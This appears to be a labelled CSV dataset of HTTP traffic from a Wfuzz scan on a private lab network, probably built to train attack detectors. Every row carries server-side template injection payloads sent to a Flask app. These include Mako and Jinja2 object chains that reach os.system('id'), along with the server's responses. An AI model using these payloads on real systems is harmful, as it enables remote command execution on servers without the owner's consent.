attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.util.compat.inspect.os.systemid}</h2> ",close,68,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34340
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.cache.util.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.cache.util.os.systemid}</h2> ",close,68,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34356
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.cache.util.compat.inspect.os.systemid}</h2> ",close,66,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34358
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.compat.inspect.os.systemid}</h2> ",close,63,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34366
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${self.template.__init__.__globals__['os'].system('id')},"<h2>Hey, {self.template.init.globalsos.systemid}</h2> ",close,54,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34368
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.cache.compat.inspect.os.systemid}</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34372
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.runtime.util.os.systemid}</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34388
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.filters.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.filters.compat.inspect.linecache.os.systemid}</h2> ",close,73,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34396
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.compat.inspect.os.systemid}</h2> ",close,72,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34408
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.compat.inspect.linecache.os.systemid}</h2> ",close,73,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34410
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.filters.compat.inspect.os.systemid}</h2> ",close,72,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34414
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.cache.compat.inspect.linecache.os.systemid}</h2> ",close,71,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34420
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.cache.util.os.systemid}</h2> ",close,66,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34430
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.exceptions.util.os.systemid}</h2> ",close,73,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34444
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.cache.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.cache.util.os.systemid}</h2> ",close,72,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34446
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.cache.util.compat.inspect.linecache.os.systemid}</h2> ",close,76,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34448
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.filters.compat.inspect.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34452
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.runtime.compat.inspect.os.systemid}</h2> ",close,84,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34468
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.filters.compat.inspect.os.systemid}</h2> ",close,84,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34472
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.runtime.exceptions.util.os.systemid}</h2> ",close,85,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34476
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template._mmarker.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.mmarker.module.runtime.util.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34486
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.runtime.exceptions.util.os.systemid}</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34498
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.compat.inspect.linecache.os.systemid}</h2> ",close,84,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34500
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.cache.compat.inspect.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34508
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.runtime.compat.inspect.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34520
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.filters.compat.inspect.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34522
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.exceptions.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.exceptions.compat.inspect.os.systemid}</h2> ",close,83,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34526
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template._mmarker.module.cache.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.mmarker.module.cache.util.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34528
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.template.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.template.module.runtime.util.os.systemid}</h2> ",close,77,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34538
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.compat.inspect.linecache.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34552
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.filters.compat.inspect.linecache.os.systemid}</h2> ",close,82,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34560
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.runtime.exceptions.util.os.systemid}</h2> ",close,81,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34566
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.cache.compat.inspect.os.systemid}</h2> ",close,76,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34572
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.template.module.cache.util.os.systemid}</h2> ",close,75,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34574
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.runtime.compat.inspect.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34576
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.cache.compat.inspect.linecache.os.systemid}</h2> ",close,80,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34578
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.cache.compat.inspect.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34586
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.util.compat.inspect.os.systemid}</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34602
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.traceback.linecache.os.systemid}</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34606
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}","<h2>Hey, {self.module.runtime.util.compat.inspect.linecache.os.systemid}</h2> ",close,78,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34608
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.context._with_template.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.context.withtemplate.module.runtime.util.os.systemid}</h2> ",close,74,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34620
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.util.compat.inspect.os.systemid}</h2> ",close,77,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34630
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.template.module.cache.util.compat.inspect.os.systemid}</h2> ",close,75,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34640
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.attr.ttrparent.module.runtime.util.os.systemid}</h2> ",close,68,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34650
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.compat.inspect.os.systemid}</h2> ",close,74,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34660
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.exceptions.traceback.linecache.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.exceptions.traceback.linecache.os.systemid}</h2> ",close,88,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34664
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{self._TemplateReference__context.joiner.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34678
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{namespace.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34688
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%23%7B3%2A3%7D%0A,"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34702
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bconfig.items%28%29%7D%7D%0A,"<h2>Hey, &lt;built-in method items of Config object at 0x7f55446d9f80&gt;</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34718
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34730
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bdump%28app%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34740
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%40%286%2B5%29%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34744
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%23%7B%203%20%2A%203%20%7D%0A,"<h2>Hey, {    }</h2> ",close,21,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34758
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7B%7B3%2A3%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34768
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7B6%2A6%7D%0A,"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34782
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%3C%25%3D%203%20%2A%203%20%25%3E%0A,"<h2>Hey,     </h2> ",close,19,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34794
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B3%2A%273%27%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34808
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B3%2A3%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34814
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{joiner.__init__.__globals__.os}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34824
